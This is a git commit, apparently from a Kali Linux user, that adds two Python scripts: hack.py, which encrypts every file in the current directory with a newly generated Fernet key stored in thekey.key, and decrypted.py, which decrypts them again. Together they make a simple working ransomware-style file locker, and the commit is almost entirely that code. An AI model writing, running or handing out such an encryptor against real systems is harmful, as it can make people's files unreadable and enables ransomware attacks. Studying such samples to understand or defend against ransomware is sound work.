8b03a4fb65968f5645eecec826072da2708e64b8
Serko64 <serko64@serko64.kali>
2023-05-24 23:15:10 +0200

    changes

---
+++ decrypted.py
@@ -0,0 +1,28 @@
+#!/usr/bin/env pyhton 3
+
+import os
+from cryptography.fernet import Fernet  
+
+files=[]
+
+for file in os.listdir():
+	if file =="hack.py" or file=="thekey.key"or file== "decrypted.py" or file == "README.txt":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+
+print(files)
+
+
+
+with open("thekey.key","rb") as thekey:
+	secretkey= thekey.read()
+
+for file in files:
+	with open(file,"rb") as thefile:
+		contents= thefile.read()
+	contents_decrypted= Fernet(secretkey).decrypt(contents)
+	with open (file,"wb") as thefile:
+		thefile.write(contents_decrypted)
+
+print("All of your files have been decrypted!")
---
+++ hack.py
@@ -0,0 +1,29 @@
+#!/usr/bin/env pyhton 3
+
+import os
+from cryptography.fernet import Fernet  
+
+files=[]
+
+for file in os.listdir():
+	if file =="hack.py" or file=="thekey.key"or file== "decrypted.py"or file=="README.txt":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+
+print(files)
+
+
+key=Fernet.generate_key()
+
+with open("thekey.key","wb") as thekey:
+	thekey.write(key)
+
+for file in files:
+	with open(file,"rb") as thefile:
+		contents= thefile.read()
+	contents_encrypted= Fernet(key).encrypt(contents)
+	with open (file,"wb") as thefile:
+		thefile.write(contents_encrypted)
+
+print("All of your files have been encrypted!")
